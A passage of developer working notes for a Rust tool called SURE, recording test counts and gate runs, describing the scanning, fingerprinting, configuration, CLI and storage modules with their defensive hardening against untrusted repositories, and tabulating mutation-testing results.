is 49 + 529 + 116 + 73 + 15 + 4 = 786.

**The arithmetic against 726 at `68e51d8` is +60 and every part is measured, not
inferred from the total.** `git diff 68e51d8..e10f620` gives **+25 `#[test]`** in
`python.rs` and **+4** in `read.rs` — the four `toml`-conversion tests — which is
the whole of `sure-core`'s lib movement, **315 → 344**; and **+31** for the new
`discover_python` target, which is also the **20th test binary** and takes the
parent sections from 23 to 24. 25 + 4 + 31 = 60. **`scan/ignore.rs` added zero
`#[test]`** — its new rows are `assert_eq!`s inside the existing vendored-set
tests — and `mod.rs` and `discover_node.rs` added none either, which is worth
stating because all three files are in the diff and a file being touched is not
a test being added.

## Gate set, as run at `68e51d8` (`P2-T004`) and `0a577ca`

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **726 passed, 0 failed, 1 ignored, across 19 test binaries and 4 doc-test targets** (all 4 ran a test) |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |

Per binary on this platform: `sure-cli` 36 **bin** + 13 `cli_contract`;
`sure-core` **315 lib** + 9 `config_loading` + **33 `discover_node`** + 6
`doctor` + 23 `fingerprint_content` + 43 `fingerprint_git` + 30
`scan_project` + 6 `store_concurrency` + 4 `store_packaging`; `sure-domain` 87
lib + 29 `wire_contract`; `sure-protocol` 46 lib + 12 `conformance` + 15
`round_trip`; `sure-testkit` 0 lib + 7 `integration_thinness` + 8
`repository_shape`; `Doc-tests sure_core` **4**. That is 49 + 469 + 116 + 73 +
15 + 4 = 726.

**The arithmetic against 668 at `7ce90bf` is +58, and every part is measured
rather than inferred from the total:** **+24** in `sure-core`'s lib target (291
→ 315), all of them `discover::`, taken from `cargo test -p sure-core --lib --
--list | grep -c '^discover::'`; **+33** for the new `discover_node` target,
which is also the **19th test binary**; and **+1** doc-test, `discover::discover`.
24 + 33 + 1 = 58.

**The 668 in that comparison is right, and three earlier figures in this
session's working notes were wrong.** They are recorded because the way they were
wrong is the useful part: `669` came from subtracting the two new *sources* from
the total and forgetting that one of the additions is a **doc test**, which
belongs to no new file; `723` was a real measurement of this same tree taken when
`discover_node` held 30 tests rather than 33, so it is a measurement of a state
that no longer exists and not a contradiction; and `725` came from believing
"two tests were added" when **three** were. The rule under "Counting `#[test]`
attributes" applies to deltas as much as to absolutes: take the number from a
run, and take the per-target figure from `--list` rather than from a file's
contents.

## Gate set, as run at `7ce90bf` (`P2-T003`)

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets -- -D warnings` | clean |
| `cargo test --workspace` | **668 passed, 0 failed, 1 ignored, across 18 test binaries and 4 doc-test targets** (3 of which ran a test) |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |

Per binary on this platform: `sure-cli` 36 **bin** + 13 `cli_contract`;
`sure-core` **291 lib** + 9 `config_loading` + 6 `doctor` + **23
`fingerprint_content`** + **43 `fingerprint_git`** + 30 `scan_project` + 6
`store_concurrency` + 4 `store_packaging`; `sure-domain` 87 lib + 29
`wire_contract`; `sure-protocol` 46 lib + 12 `conformance` + 15 `round_trip`;
`sure-testkit` 0 lib + 7 `integration_thinness` + 8 `repository_shape`;
`Doc-tests sure_core` **3**. That is 665 + 3 = 668.

**The arithmetic against the last recorded total, 628 at `9f13f0d`, is +40, and
the parts are each measured rather than inferred from the total:** **+23** for
the new `fingerprint_content` target; **+7** in `sure-core`'s lib target (284 →
291), which `git grep -c '#\[test\]'` accounts for **by file** — `git/mod.rs`
3 → 8, `choose.rs` absent → 1, `content.rs` absent → 1, and no other file in
`crates/sure-core/src` changed its count; **+8** in `fingerprint_git` (35 → 43 on
this platform, and `5705444`'s own entry already records 40 → 43 of that, from
the filter refusals); **+2** doc-tests, which are the `no_run` examples on
`content_fingerprint` and `project_fingerprint`. 23 + 7 + 8 + 2 = 40.

**The aggregate attribute count is not the test count and is not used here.**
`crates/sure-core/src` holds 297 `#[test]` lines against 291 lib tests on this
platform, and the difference is the tests gated to the other one — three by an
attribute on the function, plus the `#[cfg(unix)]` test modules in
`paths/compare.rs`. That is a second reason the note under "Count the parent
lines" applies; the per-file *delta* is exact and the absolute figure is not.

**The two platforms do not run the same tests, and the count now differs by
more than it did.** Both new `#[cfg(unix)]` tests are in `fingerprint_content`, so
that target is 23 here and **25 on Unix**, and `fingerprint_git` is 43 here and
**47 on Unix**. The set-difference table below was measured at `9f13f0d` and is
therefore **stale** — the Linux-only set gains those two names, and the
prediction written here was **net +3 on Linux, 668 + 3 = 671**. Nothing on this
machine could run them, and `target/tmp/diff_test_names.py` reads the names out of
a run's logs. **Run `34845282962` measured it and the prediction held**: 671 on
Linux, 670 on macOS, and the sets are 8 Windows-only and 11 Linux-only. See
"Reading run `34845282962`" below for the arithmetic.

## Gate set, as run at `P2-T002`

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --all-features --no-fail-fast` | **624 passed, 0 failed, 1 ignored, across 17 test binaries and 4 doc-test targets** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |

Per binary: `sure-cli` 36 **bin** + 13 `cli_contract`; `sure-core` **281 lib** + 9
`config_loading` + 6 `doctor` + 30 `scan_project` + 6 `store_concurrency` + 4
`store_packaging` + **34 `fingerprint_git`**; `sure-domain` 87 lib + 29
`wire_contract`; `sure-protocol` 46 lib + 12 `conformance` + 15 `round_trip`;
`sure-testkit` 0 lib + 7 `integration_thinness` + 8 `repository_shape`;
`Doc-tests sure_core` 1.

The arithmetic: 553 at `P2-T001`, **624 here (+71)** = 37 in `sure-core`'s lib
target (244 → 281: 8 digest + 5 error + 16 status + 3 `fingerprint/mod.rs` + 5
in `scan/ignore.rs` for `left_out`) plus the new `fingerprint_git` integration
target's **34 on Windows, 37 on Unix** (the three `#[cfg(unix)]` bodies are
compiled only there, so the CI number will be three higher and is not a
discrepancy). The **17** binaries are 16 plus `fingerprint_git`; the previous
entry's "16" was right for its commit.

The single `ignored` is not new and not a gap being hidden: it is
`store_concurrency.rs:167`, `#[ignore = "spawned by the parent tests, not run on
its own"]`, and it has read that way since `P1-T005`.

### Gate set, as run at `9f13f0d`

The same commands, after the hardening described under "What `P2-T002` added":
**628 passed, 0 failed, 1 ignored, across the same 17 test binaries and 4
doc-test targets** — 624, plus **three** containment tests added to `git/mod.rs`
by `c735a2f` (`a_path_that_climbs_is_refused_with_or_without_a_prefix`,
`a_path_inside_the_prefix_is_still_accepted`,
`the_prefix_comes_off_as_path_components_and_not_as_text`, all in `sure-core`'s
**lib** target), plus one for the Git safety arguments in the `fingerprint_git`
integration target. 624 + 3 + 1 = 628, which is what the run printed.

`fingerprint_git` is therefore 35 on Windows and **39 on Unix** — the same 35 plus
the four `#[cfg(unix)]` bodies, three of which predate the `P2-T002` session.

**The two platforms do not run the same number of tests, and the difference is
now enumerated rather than waved at.** Linux reports **629**, one more than
Windows, and the arithmetic is a set difference over test *names* — by name and
not by target, because attributing a result line to its binary depends on the
`Running …` markers landing in order and in a CI log they do not:

| | Count |
| --- | --- |
| names that exist only on Windows | **8** — the seven in `paths::compare::tests::windows`, plus `fingerprint::git::status::tests::a_path_that_is_not_valid_unicode_is_refused_on_windows` |
| names that exist only on Linux | **9** — the four `#[cfg(unix)]` tests in `fingerprint_git.rs`, the three in `paths::compare::tests::unix`, `doctor::tests::a_path_through_a_file_cannot_be_looked_at`, and `fingerprint::git::status::tests::a_path_that_is_not_valid_unicode_is_the_path_on_unix` |
| net | **+1 on Linux**, which is 628 + 1 = 629 |

Every one of the seventeen is `ok` on the platform where it ran, and no test on
either platform is anything but `ok` or `ignored`. The macOS job is a third set
again: it runs `unix::the_default_entry_point_folds_case_on_a_case_insensitive_platform`
where Linux and Windows run neither that nor `…_folds_nothing_…`, so **a green
macOS job and a green Linux job are not the same evidence** even for the same
file.

`target/tmp/diff_test_names.py` (git-ignored) is what produced this table and is
worth reusing after any push that touches platform-gated code.

The `21 targets` figure some tooling prints is **17 binaries + 4 doc-test
targets**; the two are the same number arrived at two ways, not two
measurements.

## What `P2-T002` added

`crates/sure-core/src/fingerprint/` — **the answer to "is this still the same
project?"**, and the one thing every evidence record is stamped with
(`docs/architecture/EVIDENCE_MODEL.md`: evidence whose fingerprint differs from
the current one is stale). Three files:

- `digest.rs` — `Digest`, a length-prefixed incremental SHA-256. **The domain tag
  is the first field written** (`sure.git-fingerprint.v1`), so a digest of one
  kind can never equal a digest of another; `field()` writes the byte length
  before the bytes, which is what stops `("ab", "c")` and `("a", "bc")` from
  being one digest. `optional()` writes a presence byte, not an empty string, so
  "absent" and "empty" are two states — the same distinction the change list
  needs. `hash_file` reads `limit + 1` bytes and **errors** above the limit
  rather than hashing a prefix: a hash of the first megabyte of a two-gigabyte
  file is a fingerprint of something nobody has.
- `git/mod.rs` — `Git::fingerprint(root)`. It asks Git for `status` and `HEAD`
  and then **reads the files themselves**; the digest is over file contents, not
  over Git's diff (the reasoning is in `FINGERPRINTING.md`, and it is what makes
  the fingerprint survive a `git commit --amend`, a rebase and a stash).
  `--no-renames` because a rename reported as rename-or-delete must not depend on
  Git's similarity threshold; `--untracked-files=all` because a nested checkout
  is otherwise one line with no contents; `-- .` plus `--show-prefix` because
  `--relative` **silently prints nothing at all** on Git 2.55.0 for a repo with
  changes and exit status 0; the prefix is stripped with `Path::strip_prefix`,
  not string comparison, so a project in `app/` is not confused by a sibling
  `app-old/`. Excluded directories are skipped **before** they are read, and the
  walk's losses are an error (`IncompleteTree`), never a hash of a partial tree.
- `mod.rs` — `FingerprintOptions`, `FingerprintKind`, `FingerprintError` (11
  variants), and the `git_fingerprint` entry point. The record type itself is
  `sure_domain::vocabulary::ProjectFingerprint` — `id`, `kind`, `digest`,
  `git: Option<GitState>` — with `content(..)` and `git(..)` as **constructors,
  not fields**; `mod.rs` re-exports rather than redefines it, so the wire type
  the protocol and the store already carry is the one being produced.
  **`matches` compares `kind` and `digest` and never `id`.** There is no partial
  fingerprint and no "unknown" state: a fingerprint either exists or an error
  says why not — an `Option<ProjectFingerprint>` whose `None` meant "could not
  tell" would be compared as "not equal" by every caller and quietly invalidate
  all evidence.
- `crates/sure-core/tests/fingerprint_git.rs` — 34 tests (37 on Unix) against
  real repositories in the same scratch-directory pattern as `scan_project.rs`,
  with `FIXTURE_LIMIT = 5_000`. Only the tests that need a specific Git version's
  *text* pin `GIT_AUTHOR_DATE`; the rest assert relationships between two
  fingerprints rather than literal digests, so a Git upgrade cannot turn them red
  for a reason that is not a bug.
- `docs/architecture/FINGERPRINTING.md` (new) — the rule (**a file is part of the
  fingerprint if and only if a check could read it**), the two-failure-directions
  table, the path in/out table, the link case the rule does not decide, why HEAD
  is digested and the branch name is not, and **six known coverage gaps** now —
  the sixth, pipes and devices, was added by the hardening below.
  `CHECK_PIPELINE.md` step 3 and `FROZEN_SEMANTICS.md` (a new §"What 'the same
  project state' means") both point at it.

**What the hardening added after the acceptance, and why each one is a defect
rather than a precaution.** Three commits, all on top of an already-accepted
task, none of which changes a verdict for a project that is not hostile:

- **`c735a2f` — a path Git reports could climb out of the project.**
  `relative_to_root` stripped the prefix and joined the result onto the root
  without checking it, so a path containing `..`, a root or a drive prefix would
  have been read from outside the folder SURE was asked about. It is not
  reachable through a well-behaved Git — the pathspec is `-- .` — but the
  repository is untrusted input and its index is a file in it, which is the same
  reasoning that puts `--no-optional-locks` in the invocation. The same commit
  fixed the three CI failures above.
- **`9f13f0d` — a repository could make fingerprinting run a program, or hang.**
  `core.fsmonitor` names a hook Git runs, read from the repository being
  described; `Git::SAFETY_ARGUMENTS` now overrides it and `--no-pager`. And
  `File::open` on a FIFO with no writer **blocks until a writer appears**, so a
  project that replaced a tracked file with a pipe could hang a check with no
  output — a state indistinguishable from "still working". `Reader::read` now
  answers such a path by kind without opening it.

**What the mutation run found, because the green suite did not.** Three of the
five tests added by `P2-T002` exist because a mutation survived (the section
below has the detail): the nested-repository walk in `Reader::tree` was reached
by **no test at all**; the monorepo test proved only *stability*, so an
implementation that never stripped the prefix — and therefore never read any
file's contents — passed every assertion it made; and the byte budget had only
ever been exercised with one file, which cannot tell a per-file budget from a
per-fingerprint one. None of the three was visible as a failure.

## What `P2-T001` added

`crates/sure-core/src/scan/` — **the file list every later stage reads**, and the
place where a loss becomes invisible. Four modules plus a new integration target:

- `skip.rs` — `SkipReason` (ten variants) and `Skipped`. **A skip is a value in
  the result, not a log line**, which is the whole task: a scanner that returns a
  list of files has said nothing about the files it did not return.
  - `is_by_design()` and `loses_coverage()` are **two full `match`es, not one
    predicate and its negation**. A negation answers `false` — "not a loss" — for
    a variant nobody thought about, and that is the quiet direction. A new variant
    now fails to compile in both until both questions are answered.
  - `NotFollowed` and `SpecialFile` are **losses even though not looking at them
    is deliberate**: what a link points at is not in the scan, and a pipe is an
    entry that exists and is not in the list. Classifying them as "by design"
    because the scanner chose them would be the scanner grading its own decision.
  - `SureCache` (`.sure`) is separate from `Cache` for a reason none of the
    others have: a fingerprint taken over a tree containing SURE's own output
    changes *when SURE runs*, so checking a project would change the thing being
    checked.
  - The `.sure` rule is spelled through `paths::PROJECT_CACHE_DIR`, not as a
    literal, so the directory SURE writes into and the one it skips cannot drift.
- `ignore.rs` — two tables of exact names, **split by entry kind**. `build`,
  `target` and `dist` are both a tool's output directory and a hand-written
  script at the root; one table keyed on the name alone cannot tell those apart
  and drops the script. `bin`, `obj`, `out`, `Debug`, `Release` and `third_party`
  are deliberately **not** in either table — each is a plausible project
  directory, and leaving a real directory out of a scan is a loss.
  `matching_rule(name, kind, case)` takes the case rule as an **argument**, so
  both platform rules are testable on one machine; the fold is ASCII-only.
- `error.rs` — `ScanError`, the four refusals (`NotAbsolute`, `Missing`,
  `NotADirectory`, `Unreadable`). Each is *no scan at all* rather than a scan with
  losses, because an empty `Scan` and a project with nothing in it look the same.
  Each message names the path and says what SURE did instead; `Unreadable` quotes
  the operating system rather than paraphrasing it.
- `mod.rs` — `scan(root, ScanOptions)`, `Scan`, `Entry`, `EntryKind`,
  `display_path`, and the walker. **It reads no file contents** — names and
  file-or-directory only — and a source scan in `tests/scan_project.rs` asserts
  exactly that against the four files, because a scan of a project whose files
  are huge, encrypted, on a slow share or cloud placeholders that would be
  *fetched* by being read must cost the same as any other.
- `tests/scan_project.rs` — 30 tests over real filesystems, in scratch
  directories under `target/tmp/` whose *names* contain a space and a non-ASCII
  character, so every path in every test is a path the platforms disagree about.
  Links are built with `mklink /J` on Windows and `symlink` elsewhere.
- `docs/architecture/PROJECT_DISCOVERY.md` (new) — the three guarantees, the skip
  vocabulary, both tables and what is deliberately absent from them, the four
  refusals, determinism, and three **known coverage gaps**. `CHECK_PIPELINE.md`
  step 1 now points at it, and `FROZEN_SEMANTICS.md` gained four rows plus a new
  §Closed vocabularies are matched in full.

**The three guarantees, and how each is held.** *Stays inside the root*: children
are the parent's path joined with one `file_name()` from the operating system —
a single component, no separator, no `..` — and links are never followed. That is
an argument *from construction*, not a check that could be wrong, which is why
`SkipReason` has no `Outside` variant. *Is bounded*: `max_depth` (32) and
`max_entries` (200 000), each recorded when it bites; a directory of two hundred
thousand files does not hang SURE, it makes SURE say it stopped. *Says what it did
not look at*: `Scan::is_complete()` is the one question a caller must answer, and
`losses()` versus `scope()` separates "something may be missing" from "SURE said
it would not look there".

**Three decisions worth keeping.** `DirEntry::file_type()` reports a junction as
`is_symlink() == true, is_dir() == false`, so the walk's arms are matched
symlink-first; without that the `Some(_)` arm would file every junction on Windows
as a `SpecialFile` and the "never followed" guarantee would be nominal. The
ignore tables are consulted *after* that arm, so a link named `node_modules` is
truthfully reported as `NotFollowed` (a loss)
rather than `Vendored` (declared scope) — reporting the wrong reason is by itself
enough to turn a loss green. The root **is** followed through a link and is not
subject to the ignore tables: the caller named it, and a scan of a directory
called `target` scans it. And `.gitignore` is deliberately not consulted: a
project's ignore file is a statement about the repository, which is a different
question from what belongs in a check.

## What `P1-T011` added

`crates/sure-core/src/config/authority.rs` (new, 18 tests) — **the answer to
"the project's file asked for host execution; is that a yes?"**, which is a
question about two files rather than about one.

- `Layer { User, Project }` with `can_grant()`. Ranks 2 and 4 of
  `CONFIG_AUTHORITY.md` exist; **rank 3 (organization policy) deliberately does
  not**, and neither `Layer` nor `ConsentGrantor` offers a way to name it — a
  source a caller can name but never obtain is how a documented feature becomes
  a believed one. Rank 1 is a decision rather than a file and lives in
  `ConsentGrantor::InteractiveUser`.
- `Privilege { request, asked_by, granted_by }`. The refusal is a **value**, not
  an omission: a file that asked for network access and did not get it leaves a
  `Privilege` behind, so a report can say what was asked for. Dropping it would
  make "the project asked and was refused" and "the project asked for nothing"
  the same list.
- `Resolved<T> { value, by: Option<Layer> }`. `by: None` means "nothing beyond
  the default", not "SURE did not work it out". Protection and privacy resolve
  to the **stricter** value either layer set, and `by` names the most trusted
  layer that asked for it.
- `Authority::load` / `new` / `privileges` / `privilege` / `permissions` /
  `protection` / `privacy_mode`.

**There is no merged `Config` and no `Authority::effective()`** — a merge was
rejected by ADR 0011 because it cannot be reported back in terms of the files the
user wrote. `Authority::permissions()` answers "which permissions a *file* was
allowed to hand over", which is a different question from
`sure_domain::execution::decide`'s "may this action run"; the execution **mode
is not a permission**, so a project asking for `host_confirmed` gets nothing in
the permission set.

`docs/architecture/CONFIG_AUTHORITY.md` was rewritten around what exists: the
order and the may/may-not lists are kept, and **"Nothing routes through it yet"**
is stated plainly — no command builds an `Authority` today, and wiring it in
front of the check pipeline is **P13-T009**. Until then a report that claimed a
project's request was refused would be describing behaviour that has not run.

Two smaller changes: `Config::load_file(path)` splits from `Config::load(root)`
so the user's own file is read by the same reader (the near-miss `sure.yml` check
now follows the requested *file name*, not its directory), and
`neither_routes_through_the_authority_yet`-style honesty in the docs.

**The one test that could not be written any other way** is
`both_files_are_read_from_where_they_were_asked_for`, which goes through
`Authority::load` with two real files. An `Authority` that found the user's file
and silently discarded it passes every test that builds one directly — proved by
mutation before the test was written.

## What `P1-T010` added

The protocol version handshake, in one function used by two callers:

- `crates/sure-protocol/src/handshake.rs` (new) — `Handshake { Agreed,
  CallerIsOlder, CallerIsNewer }`, `negotiate(u32) -> Handshake`, the three
  accessors, and `Display`. **The whole version rule.** The module documentation
  says why the rule is exact equality, why there is no compatibility table, and
  why the two directions are not the same answer.
- `crates/sure-protocol/src/event.rs` — `from_json` calls `negotiate` rather
  than comparing numbers, so the reader and the CLI cannot drift. The test
  `the_reader_and_the_handshake_refuse_the_same_versions` drives both over
  `0..=PROTOCOL_VERSION + 3`.
- `crates/sure-core/src/lib.rs` — re-exports `Handshake` and `negotiate`.
  `sure-cli` has one edge into the engine (ADR 0001, and the note in its
  manifest), so a new protocol type is re-exported rather than added as a
  second dependency.
- `crates/sure-cli/src/cli.rs` — `Protocol` grows `--speaks VERSION`.
- `crates/sure-cli/src/commands.rs` — one more arm; with `--speaks`, the answer
  is `sure_core::negotiate`'s.
- `crates/sure-cli/src/report.rs` — `Report::Handshake`, and with it the two
  predicates: `outcome` is `ok` or `unavailable`, `exit_code` is 0 or **3**, and
  `is_an_answer` is `handshake.is_agreed()` — so the agreed sentence goes to
  stdout and the refusal to stderr, by the same predicate as every other
  command. The frame carries `sure_speaks`, `caller_speaks`, `agreed` and
  `update`, never the sentence.
- `crates/sure-cli/tests/cli_contract.rs` — a process-level test that reads the
  version out of `sure protocol --format json`'s own frame and then requires
  that exact number to be agreed and the two neighbouring ones refused, in both
  directions. It carries no copy of the version, so it cannot keep passing after
  what SURE announces and what it accepts have drifted apart.

`docs/architecture/PROTOCOL.md` gained §The handshake and lost two of its three
known gaps; `docs/architecture/CLI.md` gained §`sure protocol`.

**What this does not cover.** The acceptance criterion names CLI, hook and MCP
adapters. The hook and the MCP server are commands this build does not
implement, so nothing but a caller's own shell has run the handshake. The rule
is reachable, and `PROTOCOL.md` §Known gaps now says which half is missing
rather than implying the whole of it is done.

## What `P1-T009` added

`sure doctor` — the first command whose answer depends on what it found, and so
the first place where "the run was fine" and "the answer was fine" come apart.

- `crates/sure-core/src/doctor.rs` — `examine_this_machine()` returns a
  `DoctorReport` **value** (paths, presence, store facts, one tool, problems,
  and what it did not check), so a test can build one and a renderer can read
  it. Exit 0 when `is_well()`, **1** when it is not: the false-green rule applied
  to SURE's own installation, so `sure doctor || fix it` works.
- `crates/sure-cli/src/doctor.rs` — the human and machine renderers, separately.
- Three things it deliberately does not do, each structural rather than
  promised: it does not read the settings file (no field could hold a secret,
  and a source scan in `tests/doctor.rs` enforces it), it does not create the
  store (presence checked before `Store::open_at`), and it does not run the
  programs it finds.

## What `P1-T008` added

`crates/sure-cli/` — the command surface, and the two ways a result reaches a
person and a script:

- `src/cli.rs` — the grammar as one `enum Command` plus `HistoryAction`,
  `ConfigAction`, `HookAction`. `docs/architecture/CLI.md` lists the same ten
  commands in the same order, and a test compares the doc against what this
  build parses.
- `src/report.rs` — `report::exit` (the whole status table, the only place a
  status is chosen), `NotYet`, and `Report { Version, Protocol, Unavailable }`
  with `human`, `machine` and `frame`.
- `src/output.rs` — `Format` and the two output paths. **The only module in the
  crate that names a process stream.**
- `src/commands.rs` — `Command::report`, one exhaustive match with no `_` arm
  and no `unreachable!()`. Adding a command to the grammar fails the build here
  until somebody decides whether this build implements it.
- `src/main.rs` — `try_parse` rather than `Parser::parse`, so clap's exit status
  goes through `status_of` and the documented table stays SURE's. 22 unit tests.
- `tests/cli_contract.rs` — 11 process-boundary tests over the built binary.
- `docs/architecture/CLI.md`, and two amendments to `PROTOCOL.md`.

`clap` 4.6.6 is `sure-cli`'s first dependency, named by `RUST_DESIGN.md`.

**Two commands work: `version` and `protocol`.** Both answer questions about SURE
rather than about a project, which is why they need no engine. Every other
documented command parses its arguments, decides it cannot do the job, exits **3**
and says so in one sentence. Nothing is half-done; nothing that did nothing exits
0. `docs/architecture/CLI.md` §Exit statuses is the table, and it marks two
statuses (1 and 4) as reserved before anything returns them so a script written
against this release is not invalidated later.

## What `P1-T005` added

`crates/sure-core/src/store/` — one SQLite file, at `Paths::store_file()`:

- `mod.rs` — `Store`, `StoreOptions`, `HistoryFilter`, the five-point concurrency
  contract, redaction-then-validation on the write path, and the one bounded
  retry in the module (`establish_journal_mode`).
- `migrations.rs` — `PRAGMA user_version`, one transaction per migration, an
  append-only `MIGRATIONS` list, and refusals for a newer file, a foreign file
  and a version that is not a version.
- `sql/0001_records.sql` — one `STRICT` table with `AUTOINCREMENT` and three
  indexes. `include_str!`, so an installed `sure.exe` migrates against what its
  code was built from.
- `record.rs` — `RecordKind` (the six documents plus `Recording`) and
  `StoredRecord`, which carries `document_version` and refuses a row from a newer
  build. This closes `FROZEN_SEMANTICS.md` conformance gap 3 and `PROTOCOL.md`
  known gap 1.
- `error.rs` — `StoreError`, every message saying what SURE did instead.
- `tests/store_concurrency.rs` — real child processes, with a barrier.
- `tests/store_packaging.rs` — `bundled`, no async runtime, no unsafe.

`docs/architecture/STORAGE_AND_DATA_PATHS.md` gained a §The store.

## Two real bugs this task found, both by mutation-checking a green test

Recorded because both are the kind of thing that ships silently.

1. **`PRAGMA journal_mode = WAL` bypasses the busy handler.** SQLite's
   `sqlite3_busy_handler` documentation names the journal-mode change as a case
   where it declines to invoke the handler, because waiting could deadlock. Five
   of six processes opening a *fresh* database therefore died with
   `database is locked` before reaching a single write — reported as
   `StoreError::Open`, so the message said the file could not be opened rather
   than that anyone had contended. Fixed by `establish_journal_mode`, which waits
   for the same `busy_timeout` and reports `StoreError::Busy`.
2. **`Store::write_error` reported `DEFAULT_BUSY_TIMEOUT`, not the configured
   one.** A store opened with a 50 ms timeout told the user "SURE waited 5000 ms",
   which is a false statement about what just happened with no way for the reader
   to tell.

Neither was visible until `tests/store_concurrency.rs` was made to *fail*: the
first version of that test passed with the bug present, because spawning six
processes takes longer than migrating a database and the children never
collided. The barrier (`a_moment_from_now`, an 800 ms spin) is what made the
contention real. **A test that cannot fail is worse than no test, because it is
read as evidence.**

## Adversarial (mutation) verifications on this branch

Each was reverted after confirming the check fires.

### `P4-T002`

**Twenty-three mutations: twenty-three caught, eight of them by exactly one
test.** The pairs are held in `target/tmp/p4t002-mutations.py` as a list of
`(name, the claim it makes false, target, old text, new text)` and it drives
`target/tmp/mutate3.py` once per mutation; the log is
`target/tmp/p4t002-mutations.log`, and **every count in this section is read out
of that log rather than out of the commit message.** Three files carry the
claims: `crates/sure-core/src/checks/mod.rs`, `.../checks/node.rs` and
`.../schedule.rs`. **The set was run three times and only the third log is the
one these numbers come from**: the first run left four survivors, the second left
one, and each time the set was re-run in full so the log is one vintage against
the tree that was committed.

| mutation | caught by |
| --- | --- |
| m1 the component is dropped from the identifier's digest | **three**, including `a_workspace_member_is_checked_under_its_own_identifier_and_its_own_title` |
| m2 the tag is trusted, so punctuation reaches the identifier body | `an_identifier_is_well_formed_for_every_tag_and_component_this_can_be_given` and `an_identifier_is_the_same_every_time_and_different_for_every_check` |
| m3 a declared-but-unusable script is called a scope limit | **four**, including `every_role_the_acceptance_names_is_either_a_check_or_a_skipped_result` |
| m4 a project that cannot name a runner is called a scope limit | `every_missing_command_is_skipped_and_none_of_them_is_a_pass` and `the_sentence_a_person_reads_is_not_the_vocabularys_sentence_where_that_one_is_false` |
| m5 the printed sentence is the vocabulary's, not SURE's | **two**, as m4's second |
| m6 the third kind is dropped from `MissingKind::ALL` | `a_component_that_is_not_there_is_not_a_component_with_no_command` — **a rule over the whole set stops covering it** |
| m7 a missing command's one-line description drops why it is missing | `every_missing_command_is_skipped_and_none_of_them_is_a_pass` — **a survivor on the first run** |
| m8 a lint failure is made a reason not to hand the project over | `every_role_the_acceptance_names_is_either_a_check_or_a_skipped_result` and `the_table_carries_the_four_checks_and_the_weight_this_module_argues_for_each` |
| m9 a failing test suite stops being a reason not to hand the project over | **three**, including the same two as m8 |
| m10 a type check failure is made a reason not to hand the project over | `the_table_carries_the_four_checks_and_the_weight_this_module_argues_for_each` — **a survivor on the first run** |
| m11 a lint failure is weighted as heavily as a failing build | the same test as m10 — **a survivor on the first run** |
| m12 a workspace member's manifest is not a component | **three**, including `the_same_project_is_checked_under_the_same_identifiers_every_time` |
| m13 a member's check is titled as though it were the root's | **two**, including `the_root_manifest_and_every_readable_member_is_its_own_component` |
| m14 the runner is asked about before the script is | `the_two_ways_a_project_can_fail_to_name_a_runner_are_told_apart` |
| m15 a script that is there and unusable is reported as a script that is not there | **three**, including `a_script_that_is_there_and_is_not_a_command_is_not_a_script_that_is_not_there` |
| m16 a project that names no runner is run by npm anyway | `the_two_ways_a_project_can_fail_to_name_a_runner_are_told_apart` |
| m17 the two ways a project fails to name a runner are rendered alike | the same test as m16 |
| m18 the four roles of one manifest share one identifier | **five**, including `nothing_this_module_builds_is_refused_and_the_plan_holds_everything` |
| m19 every proposal claims to be an observation rather than a deterministic check | `a_declared_script_becomes_a_check_running_the_command_sure_would_run` |
| m20 `not_checked` produces no results at all | **three**, including `a_project_that_declares_nothing_is_not_a_project_that_fails` |
| m21 a project with only gaps reports itself as having nothing to say | `a_project_whose_only_findings_are_gaps_is_not_a_project_with_nothing_to_say` — **a survivor on the first *and* second runs** |
| m22 the sentence about a declared command stops naming the command | `the_reason_names_the_command_sure_would_run_and_not_the_script_text` and `every_reason_says_what_it_is_about_and_which_ones_name_nothing` |
| m23 the sentence about a declared command stops naming the file | the same two as m22 |

**The four survivors of the first run were one finding, and it is the finding this
task is worth recording for: a claim with prose and no test.** m7, m10, m11 and
m21 each passed **all 1045 tests** — every one of the 37 targets ran, which is
what makes a survivor a finding rather than a gap in the harness. Flipping the
lint's severity from `CanFixLater` to `MustFix`, flipping the type check's
`critical` from `false` to `true`, deleting the explanation from
`MissingCommand::plain_description`, and answering `NodeChecks::is_empty` from
`proposed` alone: **the paragraph above the role table was the only thing in the
repository that said why the table reads the way it does.** Four tests now hold
them — `the_table_carries_the_four_checks_and_the_weight_this_module_argues_for_each`
pins the whole table as a value, three assertions were added to
`every_missing_command_is_skipped_and_none_of_them_is_a_pass`, and
`a_project_whose_only_findings_are_gaps_is_not_a_project_with_nothing_to_say` is
new.

**`m21` then survived its own test, which is the more useful half.** The first
version of that test used a project with **one** script, so `proposed.is_empty()`
was `false` under the original and under the mutation alike, and it **passed with
the mutation applied**. A test for a conjunction is worth exactly as much as the
case where the two conjuncts differ; the fixture is now a project that declares
nothing — no proposals, four gaps — which is the only shape where the two
readings come apart. **This is `P4-T001`'s `m16` lesson one level further out**:
there the mutation found that a derived predicate had no test of its own, and
here it found that a test written against a mutation was vacuous.

**`mutate3.py` gained `--no-fail-fast`, and the reason is a measurement rather
than a preference.** `cargo test` stops at the first failing target, so on the
first run every "caught by" list in the log was a **floor** — whatever the
library's own binary happened to hold — and only the four survivors were rows
that could be trusted, because a survivor is the one answer fail-fast cannot
fake: a run where **every** target ran and passed. With the flag, all 37 targets
run for every mutation and the counts above are counts. **The first log's
"caught by three" and "caught by one" are therefore not comparable with these**,
which is why the counts here are read from the third log and not the first.

### `P4-T001`

**Nineteen mutations: nineteen caught, twelve of them by exactly one test.** The
pairs are held in `target/tmp/p4t001-mutations.py` as a list of
`(name, the claim it makes false, old text, new text)` and it drives
`target/tmp/mutate3.py` once per mutation; the log is
`target/tmp/p4t001-mutations.log`, and **every count in this section is read out
of that log rather than out of the commit message.** The driver carries the
claim, so a *survivor* is a sentence nothing holds rather than a mutation someone
forgot to write a test for, and each entry names the sentence it breaks.

| mutation | caught by |
| --- | --- |
